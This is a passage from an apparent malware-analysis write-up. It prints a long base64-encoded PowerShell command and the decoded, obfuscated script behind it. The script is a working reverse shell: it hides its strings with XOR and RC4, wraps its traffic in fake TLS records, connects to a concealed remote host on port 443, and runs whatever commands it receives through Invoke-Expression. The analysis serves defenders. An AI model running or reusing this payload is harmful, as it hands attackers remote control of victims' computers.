GUAKAAkAEIAQgA4ADgAQgBCAEIAQgA4ADgAQgA4ADgAOAA4AEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgAIAA9ACAAQAAoADAAeAAwADAAKQAgACsAIAAkAEIAQgA4ADgAQgBCAEIAQgA4ADgAQgA4ADgAOAA4AEIAIAArACAAJABCAEIAQgBCADgAQgA4AEIAQgA4ADgAOABCADgAOABCAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4AEIAQgBCAEIAOABCADgAOAA4ADgAQgBCADgAIAA9ACAAWwBiAHkAdABlAFsAXQBdACAAKABbAEIAaQB0AEMAbwBuAHYAZQByAHQAZQByAF0AOgA6AEcAZQB0AEIAeQB0AGUAcwAoAFsAVQBJAG4AdAAxADYAXQAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgALgBMAGUAbgBnAHQAaAApACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBBAHIAcgBhAHkAXQA6ADoAUgBlAHYAZQByAHMAZQAoACQAQgBCADgAQgBCAEIAQgA4AEIAOAA4ADgAOABCAEIAOAApAAoAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4ADgAQgA4ADgAQgBCADgAOAA4AEIAOAA4ACAAPQAgACQAQgBCADgAQgBCAEIAQgA4AEIAOAA4ADgAOABCAEIAOAAgACsAIAAkAEIAOAA4ADgAOAA4AEIAOAA4ADgAOAA4ADgAQgBCADgACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAOAA4AEIAOAA4ADgAQgBCAEIAOABCADgAQgBCACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAWwBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBHAGUAdABCAHkAdABlAHMAKABbAFUASQBuAHQAMQA2AF0AJABCADgAOAA4ADgAQgA4ADgAQgBCADgAOAA4AEIAOAA4AC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAOAA4ADgAQgA4ADgAOABCAEIAQgA4AEIAOABCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAQgA4ADgAQgBCAEIAQgA4AEIAOAA4AEIAOAAgAD0AIABAACgAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMAAwACkAIAArACAAJABCADgAOAA4AEIAOAA4ADgAQgBCAEIAOABCADgAQgBCACAAKwAgACQAQgA4ADgAOAA4AEIAOAA4AEIAQgA4ADgAOABCADgAOAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOAA4AEIAOABCAEIAOAA4AEIAOAA4AEIAIAA9ACAAQAAoADAAeAAwADAALAAgADAAeAAwAGIALAAwAHgAMAAwACwAMAB4ADAANAAsADAAeAAwADMALAAwAHgAMAAwACwAMAB4ADAAMQAsADAAeAAwADIALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMABhACwAMAB4ADAAMAAsADAAeAAxADYALAAwAHgAMAAwACwAMAB4ADEANAAsADAAeAAwADAALAAwAHgAMQBkACwAMAB4ADAAMAAsADAAeAAxADcALAAwAHgAMAAwACwAMAB4ADEAZQAsADAAeAAwADAALAAwAHgAMQA5ACwAMAB4ADAAMAAsADAAeAAxADgALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeAAwADEALAAwAHgAMAAxACwAMAB4ADAAMQAsADAAeAAwADIALAAwAHgAMAAxACwAMAB4ADAAMwAsADAAeAAwADEALAAwAHgAMAA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAyADMALAAwAHgAMAAwACwAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAxADYALAAwAHgAMAAwACwAMAB4ADAAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMQA3ACwAMAB4ADAAMAAsADAAeAAwADAALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADAALAAwAHgAMABkACwAMAB4ADAAMAAsADAAeAAxAGUALAAwAHgAMAAwACwAMAB4ADEAYwAsADAAeAAwADQALAAwAHgAMAAzACwAMAB4ADAANQAsADAAeAAwADMALAAwAHgAMAA2ACwAMAB4ADAAMwAsADAAeAAwADgALAAwAHgAMAA3ACwAMAB4ADAAOAAsADAAeAAwADgALAAwAHgAMAA4ACwAMAB4ADAAOQAsADAAeAAwADgALAAwAHgAMABhACwAMAB4ADAAOAAsADAAeAAwAGIALAAwAHgAMAA4ACwAMAB4ADAANAAsADAAeAAwADgALAAwAHgAMAA1ACwAMAB4ADAAOAAsADAAeAAwADYALAAwAHgAMAA0ACwAMAB4ADAAMQAsADAAeAAwADUALAAwAHgAMAAxACwAMAB4ADAANgAsADAAeAAwADEALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMAAwACwAMAB4ADIAYgAsADAAeAAwADAALAAwAHgAMAAzACwAMAB4ADAAMgAsADAAeAAwADMALAAwAHgAMAA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAyAGQALAAwAHgAMAAwACwAMAB4ADAAMgAsADAAeAAwADEALAAwAHgAMAAxACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAMAAsADAAeAAzADMALAAwAHgAMAAwACwAMAB4ADIANgAsADAAeAAwADAALAAwAHgAMgA0ACwAMAB4ADAAMAAsADAAeAAxAGQALAAwAHgAMAAwACwAMAB4ADIAMAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAzADUALAAwAHgAOAAwACwAMAB4ADcAMgAsADAAeABkADYALAAwAHgAMwA2ACwAMAB4ADUAOAAsADAAeAA4ADAALAAwAHgAZAAxACwAMAB4AGEAZQAsADAAeABlAGEALAAwAHgAMwAyACwAMAB4ADkAYQAsADAAeABkAGYALAAwAHgAOQAxACwAMAB4ADIAMQAsADAAeAAzADgALAAwAHgAMwA4ACwAMAB4ADUAMQAsADAAeABlAGQALAAwAHgAMgAxACwAMAB4AGEAMgAsADAAeAA4AGUALAAwAHgAMwBiACwAMAB4ADcANQAsADAAeABlADkALAAwAHgANgA1ACwAMAB4AGQAMAAsADAAeABkADIALAAwAHgAYwBkACwAMAB4ADEANgAsADAAeAA2ADIALAAwAHgANQA0ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAQgA4AEIAQgA4ADgAQgBCADgAOABCACAAPQAgACQAQgA4AEIAQgA4ADgAQgBCAEIAQgA4AEIAOAA4AEIAOAAgACsAIAAkAEIAQgBCAEIAOAA4AEIAOABCAEIAOAA4AEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4AEIAOAA4ADgAOAA4ADgAOAA4AEIAOAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAWwBVAEkAbgB0ADEANgBdACQAQgBCADgAOABCAEIAOABCAEIAOAA4AEIAQgA4ADgAQgAuAEwAZQBuAGcAdABoACkAKQAKACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAQgBCAEIAOABCADgAOAA4ADgAOAA4ADgAOABCADgAKQAKACAAIAAgACAAIAAkAEIAOAA4ADgAOABCAEIAQgA4ADgAOABCADgAOAA4ADgAIAA9ACAAQAAoADAAeAAwADMALAAwAHgAMAAzACwAMAB4ADAAMAAsADAAeAAwADEALAAwAHgAMAAyACwAMAB4ADAAMwAsADAAeAAwADQALAAwAHgAMAA1ACwAMAB4ADAANgAsADAAeAAwADcALAAwAHgAMAA4ACwAMAB4ADAAOQAsADAAeAAwAGEALAAwAHgAMABiACwAMAB4ADAAYwAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADAAZAAsADAAeAAwAGUALAAwAHgAMABmACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAMQAwACwAMAB4ADEAMQAsADAAeAAxADIALAAwAHgAMQAzACwAMAB4ADEANAAsADAAeAAxADUALAAwAHgAMQA2ACwAMAB4ADEANwAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADEAOAAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAMAB4ADEAOQAsADAAeAAxAGEALAAwAHgAMQBiACwAMAB4ADEAYwAsADAAeAAxAGQALAAwAHgAMQBlACwAMAB4ADEAZgAsADAAeAAyADAALAAwAHgAZQAwACwAMAB4AGUAMQAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAZQAyACwAMAB4AGUAMwAsADAAeABlADQALAAwAHgAZQA1ACwAMAB4AGUANgAsADAAeABlADcALAAwAHgAZQA4ACwAMAB4AGUAOQAsADAAeABlAGEALAAwAHgAZQBiACwAMAB4AGUAYwAsADAAeABlAGQALAAwAHgAZQBlACwAMAB4AGUAZgAsADAAeABmADAALAAwAHgAZgAxACwAMAB4AGYAMgAsADAAeABmADMALAAwAHgAZgA0ACwAMAB4AGYANQAsADAAeABmADYALAAwAHgAZgA3ACwAMAB4AGYAOAAsADAAeABmADkALAAwAHgAZgBhACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAwAHgAZgBiACwAMAB4AGYAYwAsADAAeABmAGQALAAwAHgAZgBlACwAMAB4AGYAZgAsADAAeAAwADAALAAwAHgAMAA4ACwAMAB4ADEAMwAsADAAeAAwADIALAAwAHgAMQAzACwAMAB4ADAAMwAsADAAeAAxADMALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeABmAGYALAAwAHgAMAAxACwAMAB4ADAAMAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4AEIAOABCAEIAQgBCADgAOABCADgAQgA4AEIAIAA9ACAAJABCADgAOAA4ADgAQgBCAEIAOAA4ADgAQgA4ADgAOAA4ACAAKwAgACQAQgBCAEIAQgA4AEIAOAA4ADgAOAA4ADgAOAA4AEIAOAAgACsAIAAkAEIAQgA4ADgAQgBCADgAQgBCADgAOABCAEIAOAA4AEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCADgAQgBCAEIAOAA4AEIAOABCADgAQgA4ADgAOAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAJABCAEIAOABCADgAQgBCAEIAQgA4ADgAQgA4AEIAOABCAC4ATABlAG4AZwB0AGgAKQApAAoAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAQgA4AEIAQgBCADgAOABCADgAQgA4AEIAOAA4ADgAKQAKACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAQgA4ADgAOABCADgAQgA4AEIAIAA9ACAAQAAoADAAeAAwADEAKQAgACsAIAAkAEIAQgA4AEIAQgBCADgAOABCADgAQgA4AEIAOAA4ADgAWwAxAC4ALgAzAF0AIAArACAAJABCAEIAOABCADgAQgBCAEIAQgA4ADgAQgA4AEIAOABCAAoAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAQgA4ADgAOABCADgAQgBCADgAQgBCAEIAQgAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAoAFsAQgBpAHQAQwBvAG4AdgBlAHIAdABlAHIAXQA6ADoARwBlAHQAQgB5AHQAZQBzACgAWwBVAEkAbgB0ADEANgBdACQAQgBCAEIAOAA4AEIAQgBCADgAOAA4AEIAOABCADgAQgAuAEwAZQBuAGcAdABoACkAKQAKACAAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AFIAZQB2AGUAcgBzAGUAKAAkAEIAOAA4AEIAOAA4ADgAQgA4AEIAQgA4AEIAQgBCAEIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgA4ADgAOAA4ADgAOABCAEIAOAA4AEIAOAA4ACAAPQAgAEAAKAAwAHgAMQA2ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAwADMALAAgADAAeAAwADEAKQAgACsAIAAkAEIAOAA4AEIAOAA4ADgAQgA4AEIAQgA4AEIAQgBCAEIAIAArACAAJABCAEIAQgA4ADgAQgBCAEIAOAA4ADgAQgA4AEIAOABCAAoAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACwAJABCAEIAQgA4ADgAOAA4ADgAOABCAEIAOAA4AEIAOAA4AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACQAQgBCAEIAQgA4AEIAQgBCAEIAQgBCADgAQgA4ADgAQgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOABCAEIAQgBCAEIAQgA4AEIAOAA4AEIALgBDAG8AbgBuAGUAYwB0ACgAKABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAALQBCAEIAQgBCADgAOAA4ADgAQgBCAEIAQgBCADgAQgBCACAAQAAoADUALAA3ACwAMgA1ACwAMgAsADIANQAsADMALAAxADUALAAyADUALAA1ACwANwAsADcAKQAgAC0AQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAAgADUANQApACwAIAAoACgANQAwACAAKgAgADkAKQAgAC0AIAAoADEAMQAgACoAIAAyACkAKQAgACsAIABbAG0AYQB0AGgAXQA6ADoAUABvAHcAKAAyACwAIAAzACkAIAArACAAWwBtAGEAdABoAF0AOgA6AFMAcQByAHQAKAA0ADkAKQApAAoAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCACAAPQAgACQAQgBCAEIAQgA4AEIAQgBCAEIAQgBCADgAQgA4ADgAQgAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACAAJABCAEIAOAA4ADgAOAA4AEIAQgA4AEIAOABCADgAQgBCACAAPQAgAGwAbABJAEkAbABsAGwAbABsAEkASQBJAGwAbABsAEkACgAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCAC4AVwByAGkAdABlACgAJABCAEIAOAA4ADgAOAA4AEIAQgA4AEIAOABCADgAQgBCACwAIAAwACwAIAAkAEIAQgA4ADgAOAA4ADgAQgBCADgAQgA4AEIAOABCAEIALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOAA4ADgAQgBCADgAQgA4ADgAOAA4AEIAQgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAAxADYAMwA4ADQACgAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4ADgAOABCADgAOABCAEIAQgAuAFIAZQBhAGQAKAAkAEIAOABCADgAOAA4AEIAQgA4AEIAOAA4ADgAOABCAEIALAAgADAALAAgACQAQgA4AEIAOAA4ADgAQgBCADgAQgA4ADgAOAA4AEIAQgAuAEwAZQBuAGcAdABoACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAQgA4ADgAOABCAEIAOABCADgAOAA4ADgAQgBCACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADEANgAzADgANAAKACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4ADgAOABCAEIAQgA4AEIAOABCADgAOABCADgAQgAgAD0AIAAkAEIAQgBCAEIAOAA4ADgAOAA4ADgAQgA4ADgAQgBCAEIALgBSAGUAYQBkACgAJABCADgAQgA4ADgAOABCAEIAOABCADgAOAA4ADgAQgBCACwAIAAwACwAIAAxADYAMwA4ADQAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAgAD0AIAAkAEIAOABCADgAOAA4AEIAQgA4AEIAOAA4ADgAOABCAEIAWwA1AC4ALgAoACQAQgA4ADgAOABCAEIAQgA4AEIAOABCADgAOABCADgAQgAgAC0AIAAxACkAXQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAbABJAEkASQBsAGwAbABJAEkASQBJAGwAbABsAGwASQAgAC0AQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAgACQAQgBCAEIAOAA4AEIAOABCADgAOAA4AEIAQgBCADgAOAAgAC0AQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgApACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAALQBlAHEAIAAoAEkASQBsAEkAbABJAGwASQBsAGwASQBJAGwAbABJAGwAIAAtAEIAQgBCAEIAOAA4ADgAOABCAEIAQgBCAEIAOABCAEIAIABAACgAMQAwADkALAAxADEAMgAsADkANwAsADEAMgA0ACkAIAAtAEIAQgA4AEIAQgA4AEIAOABCAEIAQgA4AEIAOABCADgAIAA4ACkAKQAgAHsAIABiAHIAZQBhAGsAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAOAA4AEIAOABCADgAQgBCAEIAQgA4ADgAOABCACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABCADgAQgA4ADgAQgA4AEIAQgA4ADgAOABCAEIAQgA4ACAAMgA+ACYAMQApACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgA4ADgAQgA4AEIAOABCAEIAQgBCADgAOAA4AEIAIAA9ACAAKABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAALQBCAEIAQgBCADgAOAA4ADgAQgBCAEIAQgBCADgAQgBCACAAQAAoADEAOAA2ACwAMQA0ADEALAAxADQAMQAsADEANAA0ACwAMQA0ADEAKQAgAC0AQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAAgADIANQA1ACkACgAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCAEIAOABCAEIAOAA4AEIAQgA4ADgAOABCADgAIAA9ACAAbABsAGwASQBJAGwASQBJAGwASQBsAGwAbABsAGwAbAAgAC0AQgA4ADgAOABCAEIAQgBCAEIAOABCADgAQgA4AEIAQgAgACQAQgBCADgAOABCADgAQgA4AEIAQgBCAEIAOAA4ADgAQgAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgA4ADgAOAA4ADgAOABCADgAOABCAEIAQgAuAFcAcgBpAHQAZQAoACQAQgBCAEIAQgA4AEIAQgA4ADgAQgBCADgAOAA4AEIAOAAsACAAMAAsACAAJABCAEIAQgBCADgAQgBCADgAOABCAEIAOAA4ADgAQgA4AC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAOAA4ADgAOAA4AEIAOAA4AEIAQgBCAC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgBCADgAQgBCAEIAQgBCAEIAOABCADgAOABCAC4AQwBsAG8AcwBlACgAKQA= 2>$null

</div>

</div>

**Step 2: Extract and analyze the PowerShell payload** The decoded
base64 reveals obfuscated PowerShell code with the following key
components:

<div class="language-powershell highlighter-rouge">

<div class="code-header">

<span label-text="Powershell"></span>

</div>

<div class="highlight">

``` lineno
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
```

     $BBB88B8B888BBB88 = 0xf1,
                      0x6e,
        0xcd,
     0xc6,0x79,0x4c,0x66,0xd1,0x02,
              0xf8,0x33,0xc4,0x86,
                     0xe7,0xa4,
                          0x35,0x8d,
      0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,
         0x0b,0x9e,0x53,
        0xa4,0xd3
      function IIlIlIlIllIIllIl {
         param([int[]]$BBBB8888BBBBB8BB, [int]$BB8BB8B8BBB8B8B8)
                        $B8B8B8B8B8B8B8BB = ""
                 foreach ($B888BB88888BBBBB in $BBBB8888BBBBB8BB) {
                            $B8B8B8B8B8B8B8BB += [char]($B888BB88888BBBBB -bxor $BB8BB8B8BBB8B8B8)
               }
                             return $B8B8B8B8B8B8B8BB
                      }
        function lIIIlllIIIIllllI {
         param (
                             [byte[]]$B8BBB8B8BB8BBB88,
                     [byte[]]$BBB8BBB8B88B88B8
            )
                     $BBB88BB88BB8BBB8 = 0..255
                     $B888B8BB888BB88B = 0
               for ($B8BB8BBB8BB8BBBB = 0; $B8BB8BBB8BB8BBBB -lt 256; $B8BB8BBB8BB8BBBB++) {
                               $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $B8BBB8B8BB8BBB88[$B8BB8BBB8BB8BBBB % $B8BBB8B8BB8BBB88.Length]) % 256
                                 $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
         }
                         $B8BB8BBB8BB8BBBB = 0
                        $B888B8BB888BB88B = 0
                            $BBBBB8BBB8BBB88B = @()
               foreach ($BBBB88888B888BBB in $BBB8BBB8B88B88B8) {
                                 $B8BB8BBB8BB8BBBB = ($B8BB8BBB8BB8BBBB + 1) % 256
                                  $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]) % 256
                                $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
                            $B88BBB888BBB88B8 = $BBB88BB88BB8BBB8[($BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $BBB88BB88BB8BBB8[$B888B8BB888BB88B]) % 256]
                           $BBBBB8BBB8BBB88B += ($BBBB88888B888BBB -bxor $B88BBB888BBB88B8)
              }
                 return ,$BBBBB8BBB8BBB88B
                    }
        function lllIIlIIlIllllll {
                      param ([string]$B888BBBBB8B8B8BB)
                  $B888B8B8B88B8BB8 = [System.Text.Encoding]::UTF8.GetBytes($B888BBBBB8B8B8BB)
                       $BBBB8888BBBBB8BB = (lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $B888B8B8B88B8BB8) + (0x02,0x04,0x06,0x08)
                         $B88BBBBBB888888B = [System.BitConverter]::GetBytes([int16]$BBBB8888BBBBB8BB.Length)
            [Array]::Reverse($B88BBBBBB888888B)
           return (0x17, 0x03, 0x03) + $B88BBBBBB888888B + $BBBB8888BBBBB8BB
                    }
                 function llIIlllllIIIlllI {
                     $B88B888B8888B888 = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) -BB8BB8B8BBB8B8B8 222)
              $BBBB8B8BB888B88B = [System.Text.Encoding]::ASCII.GetBytes($B88B888B8888B888)
                $BB88BBBB88B8888B = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBBB8B8BB888B88B.Length))
                              [Array]::Reverse($BB88BBBB88B8888B)
                           $B88888B888888BB8 = @(0x00) + $BB88BBBB88B8888B + $BBBB8B8BB888B88B
                       $BB8BBBB8B8888BB8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$B88888B888888BB8.Length))
                           [Array]::Reverse($BB8BBBB8B8888BB8)
             $B8888B88BB888B88 = $BB8BBBB8B8888BB8 + $B88888B888888BB8
                  $B888B888BBB8B8BB = [byte[]] ([BitConverter]::GetBytes([UInt16]$B8888B88BB888B88.Length))
            [Array]::Reverse($B888B888BBB8B8BB)
                         $B8BB88BBBB8B88B8 = @(0x00,
                    0x00) + $B888B888BBB8B8BB + $B8888B88BB888B88
                     $BBBB88B8BB88B88B = @(0x00, 0x0b,0x00,0x04,0x03,0x00,0x01,0x02,
                                     0x00,0x0a,0x00,0x16,0x00,0x14,0x00,0x1d,0x00,0x17,0x00,0x1e,0x00,0x19,0x00,0x18,0x01,0x00,0x01,0x01,0x01,0x02,0x01,0x03,0x01,0x04,
                                                0x00,0x23,0x00,0x00,
                                  0x00,0x16,0x00,0x00,
                                          0x00,0x17,0x00,0x00,
                                        0x00,0x0d,0x00,0x1e,0x00,0x1c,0x04,0x03,0x05,0x03,0x06,0x03,0x08,0x07,0x08,0x08,0x08,0x09,0x08,0x0a,0x08,0x0b,0x08,0x04,0x08,0x05,0x08,0x06,0x04,0x01,0x05,0x01,0x06,0x01,
                                          0x00,0x2b,0x00,0x03,0x02,0x03,0x04,
                                 0x00,0x2d,0x00,0x02,0x01,0x01,
                                       0x00,0x33,0x00,0x26,0x00,0x24,0x00,0x1d,0x00,0x20,
